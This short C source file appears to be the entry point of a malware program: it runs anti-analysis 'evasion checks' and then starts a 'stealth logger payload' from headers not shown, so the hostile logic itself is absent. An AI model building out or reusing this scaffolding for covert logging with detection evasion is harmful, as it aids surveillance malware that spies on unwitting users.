#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include "payload.h"
#include "evasion.h"

// Signal handler for clean exit
void signal_handler(int sig) {
    printf("\nReceived signal %d, stopping payload...\n", sig);
    stop_payload();
    exit(0);
}

int main() {
    // Set up signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // Perform evasion checks
    if (perform_evasion_checks() != 0) {
        printf("Evasion checks failed. Exiting.\n");
        return 1;
    }

    // Start payload
    printf("Starting stealth logger payload...\n");
    start_payload();

    return 0;
}